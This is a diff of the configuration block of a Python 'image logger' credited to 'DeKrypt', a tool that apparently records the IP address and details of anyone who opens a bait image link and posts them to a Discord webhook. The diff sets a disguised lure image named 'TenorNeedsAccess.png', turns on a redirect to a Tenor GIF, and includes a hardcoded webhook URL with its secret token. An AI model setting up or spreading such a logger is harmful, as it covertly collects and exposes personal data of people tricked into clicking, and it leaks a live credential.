@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1336727635677548584/hf_1lFBY-hQ4SLikYd8uBbLyVsPGgiC1P5dzu4nG5JQavDc2kbqIHDmmN55CmajphU9u",
-    "image": "https://media1.tenor.com/m/m3jc1JxL1ssAAAAC/hahahahah-gahahahaha.gif", # You can also have a custom image by using a URL argument
+    "image": "https://cdn.discordapp.com/attachments/1336744702686527569/1336745119377789018/TenorNeedsAccess.png?ex=67a4ec67&is=67a39ae7&hm=0d282fdd6c8cd3600d6e18baea966fc484c4315661181ddb3a5251f4de6b57c2&", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -50,8 +50,8 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "redirect": True, # Redirect to a webpage?
+        "page": "https://media1.tenor.com/m/m3jc1JxL1ssAAAAC/hahahahah-gahahahaha.gif" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
